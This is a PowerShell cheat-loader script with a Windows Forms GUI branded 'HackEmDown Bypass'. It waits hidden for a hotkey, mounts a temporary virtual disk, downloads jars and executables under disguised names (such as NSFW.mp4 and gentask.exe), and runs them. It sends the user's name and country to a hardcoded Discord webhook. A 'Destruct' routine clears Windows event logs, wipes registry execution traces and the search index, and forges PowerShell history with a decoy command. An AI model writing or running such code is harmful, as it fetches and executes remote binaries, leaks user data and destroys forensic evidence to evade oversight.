Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Add SetErrorMode API to suppress Windows Error Reporting dialogs on destruct
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class ErrorMode {
    [DllImport("kernel32.dll")]
    public static extern uint SetErrorMode(uint uMode);
}
"@

# Constants for error mode
$SEM_FAILCRITICALERRORS = 0x0001
$SEM_NOGPFAULTERRORBOX = 0x0002
$SEM_NOALIGNMENTFAULTEXCEPT = 0x0004
$SEM_NOOPENFILEERRORBOX = 0x8000

# Discord Webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1381481586528092170/6e8NeeWj03JjQV3Q7o3Wgfgrv5cVe1BtMqHD-rK99pYmWtDGIQ9SAI8tXrDbgn86I8tu"

# Function to get public IP and country code, then convert to Discord flag emoji
function Get-CountryFlag {
    try {
        # Get IP and country data from free API
        $response = Invoke-RestMethod -Uri "https://ipapi.co/json/" -TimeoutSec 5 -ErrorAction Stop
        
        $countryCode = $response.country

        if (-not $countryCode) { return "" }

        # Convert country code (e.g. "US") to Discord regional indicator flag emoji
        $flag = ""
        foreach ($char in $countryCode.ToCharArray()) {
            $flag += [char](0x1F1E6 + ([byte]([char]::ToUpper($char)) - [byte][char]'A'))
        }
        return $flag
    } catch {
        # If API fails, return empty string
        return ""
    }
}

# Get country flag once on script start
$countryFlag = Get-CountryFlag

# Function to get current time UTC formatted string
function Get-GMTTime {
    return (Get-Date).ToUniversalTime().ToString("yyyy-MM-dd HH:mm:ss")
}

# Function to send message to Discord
function Send-DiscordMessage {
    param (
        [string]$message
    )
    
    $payload = @{
        content = $message
    } | ConvertTo-Json

    try {
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
    } catch {
        # Failed to send: ignore or log locally
    }
}

# Play sound file after download; variables to reuse
$soundFilePath  # will be set later

# Enhanced stealth setup
Set-PSReadlineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue
Clear-Content -Path "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -ErrorAction SilentlyContinue

# START OF KEY BUTTON DETECTION
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class User32 {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
}
"@

Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@

# Hide console window with error handling
try {
    $consolePtr = [Win32]::GetConsoleWindow()
    if ($consolePtr -ne [IntPtr]::Zero) {
        [Win32]::ShowWindow($consolePtr, 0) | Out-Null
    }
} catch {
    # Silently continue if console hiding fails
}

# Virtual key codes
$VK_CONTROL = 0x11
$VK_MENU = 0x12  # Alt key
$VK_F11 = 0x7A

# Wait for hotkey activation (Ctrl + Alt + F11)
while ($true) {
    try {
        $ctrlPressed = [User32]::GetAsyncKeyState($VK_CONTROL) -band 0x8000
        $altPressed = [User32]::GetAsyncKeyState($VK_MENU) -band 0x8000
        $f11Pressed = [User32]::GetAsyncKeyState($VK_F11) -band 0x8000
        
        if ($ctrlPressed -and $altPressed -and $f11Pressed) {
            break
        }
        Start-Sleep -Milliseconds 100
    } catch {
        Start-Sleep -Milliseconds 500
    }
}

# Set preferences to run silently
$ConfirmPreference = 'None'
$ErrorActionPreference = 'SilentlyContinue'
$WarningPreference = 'SilentlyContinue'
$VerbosePreference = 'SilentlyContinue'

# FILELESS VHD CREATION
$vdiskSizeMB = 2048
$randomName = [System.IO.Path]::GetRandomFileName().Replace('.', '')
$vdiskPath = "$env:TEMP\$randomName.vhd"

# Create VHD using in-memory diskpart script
$createScript = @"
create vdisk file="$vdiskPath" maximum=$vdiskSizeMB type=expandable
select vdisk file="$vdiskPath"
attach vdisk
"@

try {
    $createScript | diskpart.exe 2>$null | Out-Null
} catch {
    exit 1
}

Start-Sleep -Seconds 1

$timeout = 0
$disk = $null
while ($timeout -lt 8) {
    try {
        $disk = Get-Disk | Where-Object { $_.Location -like "*$vdiskPath*" } | Select-Object -First 1
        if ($disk) { break }
    } catch { }
    Start-Sleep -Milliseconds 500
    $timeout++
}

if ($disk) {
    try {
        if ($disk.IsOffline -eq $true) {
            Set-Disk -Number $disk.Number -IsOffline $false -ErrorAction SilentlyContinue
            Start-Sleep -Milliseconds 500
        }
        
        if ($disk.PartitionStyle -eq 'Raw') {
            Initialize-Disk -Number $disk.Number -PartitionStyle MBR -ErrorAction SilentlyContinue
            Start-Sleep -Milliseconds 500
        }
        
        $partition = New-Partition -DiskNumber $disk.Number -UseMaximumSize -DriveLetter Z -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 500
        
        Format-Volume -DriveLetter Z -FileSystem FAT32 -NewFileSystemLabel "Local Disk" -Confirm:$false -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 800
        
    } catch {
        # Continue even if disk setup partially fails
    }
}

# Download sound file directly to memory drive
$soundFilePath = "Z:\na.wav"
function Download-SoundFile {
    $soundUrl = "https://github.com/devnull-sys/devnull/raw/refs/heads/main/na.wav"
    $maxRetries = 2
    $retryCount = 0
    
    while ($retryCount -lt $maxRetries) {
        try {
            if (Test-Path "Z:\") {
                Invoke-WebRequest -Uri $soundUrl -OutFile $soundFilePath -TimeoutSec 8 -ErrorAction Stop
                if ((Test-Path $soundFilePath) -and ((Get-Item $soundFilePath).Length -gt 0)) {
                    return $true
                }
            }
        } catch { }
        $retryCount++
        if ($retryCount -lt $maxRetries) {
            Start-Sleep -Milliseconds 800
        }
    }
    return $false
}

# Quick wait for Z: drive to be ready
$driveReady = $false
for ($i = 0; $i -lt 6; $i++) {
    if (Test-Path "Z:\") {
        $driveReady = $true
        break
    }
    Start-Sleep -Milliseconds 500
}

if ($driveReady) {
    Download-SoundFile
}

# Basic trace clearing function
function Clear-BasicTraces {
    try { 
        if (Test-Path $vdiskPath) {
            Remove-Item -Path $vdiskPath -Force -ErrorAction SilentlyContinue
        }
    } catch { }
}

# Enhanced trace clearing function (comprehensive at end)
function Clear-AllTraces {
    try {
        Clear-Content -Path "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
        Set-Content -Path "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Value 'iwr -useb https://raw.githubusercontent.com/spicetify/cli/main/install.ps1 | iex' -ErrorAction SilentlyContinue
        
        $jumpListPath = "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations"
        Get-ChildItem -Path $jumpListPath -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
        
        $customJumpListPath = "$env:APPDATA\Microsoft\Windows\Recent\CustomDestinations"
        Get-ChildItem -Path $customJumpListPath -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
        
        $muiCachePath = "HKCU:\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache"
        if (Test-Path $muiCachePath) {
            Get-ItemProperty $muiCachePath -ErrorAction SilentlyContinue | 
            ForEach-Object { $_.PSObject.Properties } | 
            Where-Object { $_.Name -like "Z:\*" -or $_.Name -like "*java*" -or $_.Name -like "*diskpart*" } | 
            ForEach-Object { Remove-ItemProperty -Path $muiCachePath -Name $_.Name -ErrorAction SilentlyContinue }
        }
        
        $bamPaths = @(
            "HKLM:\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings",
            "HKLM:\SYSTEM\CurrentControlSet\Services\dam\State\UserSettings"
        )
        foreach ($bamPath in $bamPaths) {
            if (Test-Path $bamPath) {
                Get-ChildItem -Path $bamPath -ErrorAction SilentlyContinue | ForEach-Object {
                    $userPath = $_.PSPath
                    Get-ItemProperty $userPath -ErrorAction SilentlyContinue | 
                    ForEach-Object { $_.PSObject.Properties } | 
                    Where-Object { $_.Name -match "java\.exe|diskpart\.exe|mmc\.exe|powershell\.exe" } | 
                    ForEach-Object { Remove-ItemProperty -Path $userPath -Name $_.Name -ErrorAction SilentlyContinue }
                }
            }
        }
        
        $userAssistPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\UserAssist"
        if (Test-Path $userAssistPath) {
            Get-ChildItem -Path $userAssistPath -Recurse -ErrorAction SilentlyContinue | 
            Where-Object { $_.Name -like "*Count*" } | ForEach-Object {
                Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue | 
                ForEach-Object { $_.PSObject.Properties } | 
                Where-Object { $_.Name -like "*java*" -or $_.Name -like "*diskpart*" } | 
                ForEach-Object { Remove-ItemProperty -Path $_.PSPath -Name $_.Name -ErrorAction SilentlyContinue }
            }
        }
        
        Stop-Service -Name "WSearch" -Force -ErrorAction SilentlyContinue
        Remove-Item -Path "C:\ProgramData\Microsoft\Search\Data\Applications\Windows\Windows.edb" -Force -ErrorAction SilentlyContinue
        Start-Service -Name "WSearch" -ErrorAction SilentlyContinue
        
        $thumbcachePaths = @(
            "$env:LOCALAPPDATA\Microsoft\Windows\Explorer\thumbcache_*.db",
            "$env:LOCALAPPDATA\Microsoft\Windows\Explorer\iconcache_*.db"
        )
        foreach ($path in $thumbcachePaths) {
            Get-ChildItem -Path $path -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
        }
        
        $eventLogs = @("System", "Application", "Security", "Windows PowerShell")
        foreach ($log in $eventLogs) {
            Clear-EventLog -LogName $log -ErrorAction SilentlyContinue
        }
        wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
        wevtutil cl "Microsoft-Windows-Kernel-Process/Analytic" 2>$null
        
        $jvmLogPaths = @(
            "$env:USERPROFILE\.java\deployment\log\*.log",
            "$env:USERPROFILE\AppData\LocalLow\Sun\Java\Deployment\log\*.log",
            "$env:USERPROFILE\AppData\Roaming\.minecraft\logs\*.log",
            "$env:USERPROFILE\AppData\Roaming\.minecraft\feather\logs\*.log",
            "$env:TEMP\hs_err_pid*.log"
        )
        foreach ($path in $jvmLogPaths) {
            Get-ChildItem -Path $path -ErrorAction SilentlyContinue | ForEach-Object {
                Clear-Content -Path $_.FullName -ErrorAction SilentlyContinue
            }
        }
        
        if (Test-Path $vdiskPath) {
            Remove-Item -Path $vdiskPath -Force -ErrorAction SilentlyContinue
        }
        
        Remove-Item -Path "$env:TEMP\*.vhd" -Force -ErrorAction SilentlyContinue
        
    } catch { }
}

### GUI Setup with light theme per design guidelines

$form = New-Object System.Windows.Forms.Form
$form.Text = 'By Zpat - FAX'
$form.Size = New-Object System.Drawing.Size(942, 443)
$form.StartPosition = 'CenterScreen'
$form.BackColor = [System.Drawing.Color]::FromArgb(255,255,255)           # white background
$form.FormBorderStyle = 'FixedDialog'
$form.MaximizeBox = $false
$form.MinimizeBox = $false
$form.ForeColor = [System.Drawing.Color]::FromArgb(107,114,128)           # neutral gray text

# Use Segoe UI for an elegant modern look
$defaultFont = New-Object System.Drawing.Font('Segoe UI', 9)

# ASCII Art Label styled with bold font
$asciiArtText = @"
██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗███╗   ███╗██████╗  ██████╗ ██╗    ██╗███╗   ██╗
██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝████╗ ████║██╔══██╗██╔═══██╗██║    ██║████╗  ██║
███████║███████║██║     █████╔╝ █████╗  ██╔████╔██║██║  ██║██║   ██║██║ █╗ ██║██╔██╗ ██║
██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██║╚██╔╝██║██║  ██║██║   ██║██║███╗██║██║╚██╗██║
██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║ ╚═╝ ██║██████╔╝╚██████╔╝╚███╔███╔╝██║ ╚████║
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚═════╝  ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝
"@

$label = New-Object System.Windows.Forms.Label
$label.Text = $asciiArtText
$label.Font = New-Object System.Drawing.Font('Courier New', 10, [System.Drawing.FontStyle]::Bold)
$label.ForeColor = [System.Drawing.Color]::FromArgb(55, 65, 81)               # dark gray text
$label.AutoSize = $true
$label.Location = New-Object System.Drawing.Point(170, 87)
$form.Controls.Add($label)

# Create buttons with light theme colors, subtle shadows simulated with flat style
function New-Button {
    param (
        [string]$text,
        [int]$x,
        [int]$y,
        [int]$width = 120,
        [int]$height = 40,
        [string]$backColorHex = "#f3f4f6",
        [string]$foreColorHex = "#374151",
        [System.Drawing.Font]$font = $defaultFont
    )
    $btn = New-Object System.Windows.Forms.Button
    $btn.Text = $text
    $btn.Size = New-Object System.Drawing.Size($width, $height)
    $btn.Location = New-Object System.Drawing.Point($x, $y)
    $btn.BackColor = [System.Drawing.ColorTranslator]::FromHtml($backColorHex)
    $btn.ForeColor = [System.Drawing.ColorTranslator]::FromHtml($foreColorHex)
    $btn.Font = $font
    $btn.FlatStyle = 'Flat'
    $btn.FlatAppearance.BorderSize = 1
    return $btn
}

# Main Menu Buttons
$injectButton = New-Button -text 'Inject' -x 196 -y 235 -width 120 -backColorHex "#4ade80" -foreColorHex "#064e3b" -font (New-Object System.Drawing.Font('Segoe UI',11,[System.Drawing.FontStyle]::Bold))
$destructButton = New-Button -text 'Destruct' -x 730 -y 235 -width 120 -backColorHex "#ef4444" -foreColorHex "#7f1d1d" -font (New-Object System.Drawing.Font('Segoe UI',11,[System.Drawing.FontStyle]::Bold))

# Function to return to main menu
function Show-MainMenu {
    $form.Controls.Clear()
    $form.Controls.Add($label)
    $form.Controls.Add($injectButton)
    $form.Controls.Add($destructButton)
}

# Function to send Discord message for Inject buttons with success/failure, timing, and country flag
function Send-InjectDiscordNotification {
    param (
        [string]$buttonName,
        [bool]$success,
        [string]$errorMessage = "",
        [timespan]$duration
    )

    $userName = $env:USERNAME
    $durationFormatted = '{0:hh\:mm\:ss}' -f $duration
    $timeNow = Get-GMTTime

    if ($success) {
        $message = @"
# HackEmDown Bypass <a:TU3s:1343591160844779583> 

> *Information** :page_facing_up: | Name $userName From $countryFlag
> **Client $buttonName** loaded successfully ✅ --> Took $durationFormatted ⌚ 
> **Dates & Times** 📆
> ``Script loaded | Time $timeNow`` ⌚
> ``Was open for $durationFormatted`` 👁‍🗨 

-# @everyone
"@
    } else {
        $message = @"
# HackEmDown Bypass <a:TU3s:1343591160844779583> 

> **Information** :page_facing_up: | Name $userName From $countryFlag
> **Client $buttonName** failed loading ❌ --> Reason $errorMessage ❓ 
> **Date & Time** 📆
> ``Script loaded | Time $timeNow`` ⌚
> ``Was open for $durationFormatted`` 👁‍🗨 

-# @everyone
"@
    }

    Send-DiscordMessage -message $message
}

# Inject Button Click Handler
$injectButton.Add_Click({
    $form.Enabled = $false

    # Play sound if available
    if (Test-Path $soundFilePath) {
        try {
            $player = New-Object System.Media.SoundPlayer
            $player.SoundLocation = $soundFilePath
            $player.PlaySync()
        } catch { }
    }

    # Show submenu with additional inject-related buttons
    $form.Controls.Clear()
    $form.Controls.Add($label)

    # Back Button - always returns to main menu, no Discord message
    $backButton = New-Button -text "Back" -x 730 -y 336 -backColorHex "#ef4444" -foreColorHex "#7f1d1d" -font (New-Object System.Drawing.Font('Segoe UI',10,[System.Drawing.FontStyle]::Bold))
    $backButton.Add_Click({ Show-MainMenu })
    
    # Create inject submenu buttons with light theme and locations
    $prestigeButton = New-Button -text 'Prestige' -x 196 -y 235 -width 120 -backColorHex "#a78bfa" -foreColorHex "#4c1d95" -font (New-Object System.Drawing.Font('Segoe UI',10,[System.Drawing.FontStyle]::Bold))
    $doomsdayButton = New-Button -text 'DoomsDay' -x 326 -y 235 -width 120 -backColorHex "#60a5fa" -foreColorHex "#1e40af" -font (New-Object System.Drawing.Font('Segoe UI',10,[System.Drawing.FontStyle]::Bold))
    $vapev4Button = New-Button -text 'VapeV4' -x 456 -y 235 -width 120 -backColorHex "#065f46" -foreColorHex "#d1fae5" -font (New-Object System.Drawing.Font('Segoe UI',10,[System.Drawing.FontStyle]::Bold))
    $vapeliteButton = New-Button -text 'VapeLite' -x 586 -y 235 -width 120 -backColorHex "#22d3ee" -foreColorHex "#0f172a" -font (New-Object System.Drawing.Font('Segoe UI',10,[System.Drawing.FontStyle]::Bold))
    $phantomButton = New-Button -text 'Phantom' -x 716 -y 235 -width 120 -backColorHex "#7c3aed" -foreColorHex "#f3e8ff" -font (New-Object System.Drawing.Font('Segoe UI',10,[System.Drawing.FontStyle]::Bold))

    # For time measuring and error catching, define a helper for button action
    function Invoke-ButtonAction {
        param (
            [string]$buttonName,
            [scriptblock]$action
        )
        $start = Get-Date
        $success = $false
        $errorMsg = ""

        try {
            & $action
            $success = $true
        } catch {
            $errorMsg = $_.Exception.Message
            $success = $false
        }
        $duration = (Get-Date) - $start

        Send-InjectDiscordNotification -buttonName $buttonName -success:$success -errorMessage $errorMsg -duration $duration
    }

    # Attach click handlers with the Discord notify logic
    $prestigeButton.Add_Click({
        Invoke-ButtonAction -buttonName "Prestige" -action {
            if (-Not (Test-Path "Z:\NSFW.mp4")) {
                for ($i = 0; $i -lt 2; $i++) {
                    try {
                        Invoke-WebRequest "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/sodium/sodium-mc1.21.4.jar" -OutFile "Z:\NSFW.mp4" -TimeoutSec 12 -ErrorAction Stop
                        if ((Test-Path "Z:\NSFW.mp4") -and ((Get-Item "Z:\NSFW.mp4").Length -gt 0)) { break }
                    } catch { }
                    if ($i -eq 0) { Start-Sleep -Milliseconds 1000 }
                }
            }
            if ((Test-Path "Z:\NSFW.mp4") -and (Get-Command java -ErrorAction SilentlyContinue)) {
                Start-Process java -ArgumentList '-jar "Z:\NSFW.mp4"' -ErrorAction SilentlyContinue
            }
        }
    })
    
    $doomsdayButton.Add_Click({
        Invoke-ButtonAction -buttonName "DoomsDay" -action {
            if (-Not (Test-Path "Z:\cat.mp4")) {
                for ($i = 0; $i -lt 2; $i++) {
                    try {
                        Invoke-WebRequest "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/sodium/sodium-extra-mc1.21.4.jar" -OutFile "Z:\cat.mp4" -TimeoutSec 12 -ErrorAction Stop
                        if ((Test-Path "Z:\cat.mp4") -and ((Get-Item "Z:\cat.mp4").Length -gt 0)) { break }
                    } catch { }
                    if ($i -eq 0) { Start-Sleep -Milliseconds 1000 }
                }
            }
            if ((Test-Path "Z:\cat.mp4") -and (Get-Command java -ErrorAction SilentlyContinue)) {
                Start-Process java -ArgumentList '-jar "Z:\cat.mp4"' -ErrorAction SilentlyContinue
            }
        }
    })

    $vapev4Button.Add_Click({
        Invoke-ButtonAction -buttonName "VapeV4" -action {
            if (-Not (Test-Path "Z:\gentask.exe")) {
                for ($i = 0; $i -lt 2; $i++) {
                    try {
                        Invoke-WebRequest "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/ProgramData/svchost.exe" -OutFile "Z:\gentask.exe" -TimeoutSec 12 -ErrorAction Stop
                        if ((Test-Path "Z:\gentask.exe") -and ((Get-Item "Z:\gentask.exe").Length -gt 0)) { break }
                    } catch { }
                    if ($i -eq 0) { Start-Sleep -Milliseconds 1000 }
                }
            }
            if (Test-Path "Z:\gentask.exe") {
                Start-Process "Z:\gentask.exe" -ErrorAction SilentlyContinue
            }
        }
    })

    $vapeliteButton.Add_Click({
        Invoke-ButtonAction -buttonName "VapeLite" -action {
            if (-Not (Test-Path "Z:\ilasm.exe")) {
                for ($i = 0; $i -lt 2; $i++) {
                    try {
                        Invoke-WebRequest "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/ProgramData/conhost.exe" -OutFile "Z:\ilasm.exe" -TimeoutSec 12 -ErrorAction Stop
                        if ((Test-Path "Z:\ilasm.exe") -and ((Get-Item "Z:\ilasm.exe").Length -gt 0)) { break }
                    } catch { }
                    if ($i -eq 0) { Start-Sleep -Milliseconds 1000 }
                }
            }
            if (Test-Path "Z:\ilasm.exe") {
                Start-Process "Z:\ilasm.exe" -ErrorAction SilentlyContinue
            }
        }
    })

    $phantomButton.Add_Click({
        Invoke-ButtonAction -buttonName "Phantom" -action {
            $clipboardText = "-agentlib:jdwp=transport=dt_socket,server=n,suspend=y,address=phantom.clientlauncher.net:6550"
            Set-Clipboard -Value $clipboardText -ErrorAction SilentlyContinue
        }
    })

    # Add submenu buttons to form
    $form.Controls.Add($prestigeButton)
    $form.Controls.Add($doomsdayButton)
    $form.Controls.Add($vapev4Button)
    $form.Controls.Add($vapeliteButton)
    $form.Controls.Add($phantomButton)
    $form.Controls.Add($backButton)

    $form.Enabled = $true
})

# Enhanced Destruct Button Click Handler - FILELESS with error dialog suppression
$destructButton.Add_Click({
    # Suppress Windows Error Reporting dialogs
    [ErrorMode]::SetErrorMode($SEM_FAILCRITICALERRORS -bor $SEM_NOGPFAULTERRORBOX -bor $SEM_NOOPENFILEERRORBOX) | Out-Null

    $form.Hide()
    [System.Windows.Forms.Application]::DoEvents()

    try {
        Clear-BasicTraces
        $disk = $null
        $timeout = 0
        while ($timeout -lt 6) {
            try {
                $disk = Get-Disk | Where-Object { $_.Location -like "*$vdiskPath*" } | Select-Object -First 1
                if ($disk) { break }
            } catch { }
            Start-Sleep -Milliseconds 500
            $timeout++
        }
        
        if ($disk) {
            $detachScript = @"
select vdisk file="$vdiskPath"
detach vdisk
"@
            $detachScript | diskpart.exe 2>$null | Out-Null
        }
        
        Start-Sleep -Milliseconds 800

        if (Test-Path $vdiskPath) {
            Remove-Item -Path $vdiskPath -Force -ErrorAction SilentlyContinue
        }

        Remove-ItemProperty -Path "HKLM:\SYSTEM\MountedDevices" -Name "\DosDevices\Z:" -ErrorAction SilentlyContinue
        Remove-Item -Path "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Search\VolumeInfoCache\Z:" -Recurse -Force -ErrorAction SilentlyContinue

        Clear-AllTraces

    } catch { } finally {
        $form.Close()
        $form.Dispose()
        [System.Windows.Forms.Application]::Exit()

        Stop-Process -Id $PID -Force -ErrorAction SilentlyContinue
        exit 0
    }
})

# Form closing cleanup handler
$form.Add_FormClosing({
    param($sender, $e)
    Clear-BasicTraces
    [System.Windows.Forms.Application]::Exit()
})

try {
    [System.Windows.Forms.Application]::Run($form)
} catch {
    Clear-AllTraces
    exit 0
}
